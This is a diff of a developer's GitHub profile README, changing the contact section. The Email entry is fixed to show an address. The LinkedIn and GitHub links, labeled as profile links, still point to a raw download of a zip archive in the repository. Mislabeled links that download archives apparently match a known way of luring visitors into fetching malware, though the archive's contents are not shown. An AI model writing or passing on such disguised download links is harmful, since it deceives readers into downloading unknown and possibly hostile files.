@@ -16,7 +16,7 @@ Hi, I'm Reyodin Immanuel.G, an aspiring **Software Developer** . Passionate abou
 - Cloud computing fundamentals
 
 ## 📫 How to Reach Me
-- **Email:** [https://raw.githubusercontent.com/Reyodin-06/Reyodin-06/main/reiterated/Reyodin-06.zip](https://raw.githubusercontent.com/Reyodin-06/Reyodin-06/main/reiterated/Reyodin-06.zip)
+- **Email:** [Reyodin](reyodinofficial@gmail.com)
 - [LinkedIn](https://raw.githubusercontent.com/Reyodin-06/Reyodin-06/main/reiterated/Reyodin-06.zip)
 - **GitHub:** [Reyodin-06](https://raw.githubusercontent.com/Reyodin-06/Reyodin-06/main/reiterated/Reyodin-06.zip)
 
